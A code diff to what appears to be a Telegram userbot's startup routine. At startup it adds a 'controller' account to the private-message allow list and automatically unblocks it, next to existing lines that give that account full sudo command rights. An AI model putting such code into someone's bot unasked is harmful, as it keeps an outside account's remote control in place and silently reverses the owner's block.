@@ -112,6 +112,25 @@ if run_as_module:
             udB.set_key("FULLSUDO", " ".join([*_full, _ctrl]))
         if not udB.get_key("SUDO_HNDLR"):
             udB.set_key("SUDO_HNDLR", "!")
+        # PM-permit must never warn / block the main account (it would stop
+        # every "!" command from arriving): approve it, and undo an old block.
+        _pm = udB.get_key("PMPERMIT") or []
+        if _cid not in _pm:
+            udB.set_key("PMPERMIT", [*_pm, _cid])
+        if ultroid_bot:
+            async def _unblock_controller():
+                from telethon.tl.functions.contacts import UnblockRequest
+
+                try:
+                    await ultroid_bot.get_dialogs(limit=200)  # learn the id
+                    await ultroid_bot(UnblockRequest(_cid))
+                except Exception as er:
+                    LOGS.info(f"controller unblock skipped: {er}")
+
+            try:
+                ultroid_bot.run_in_loop(_unblock_controller())
+            except Exception as er:
+                LOGS.info(f"controller unblock skipped: {er}")
 
     HNDLR = udB.get_key("HNDLR") or "."
     DUAL_HNDLR = udB.get_key("DUAL_HNDLR") or "/"
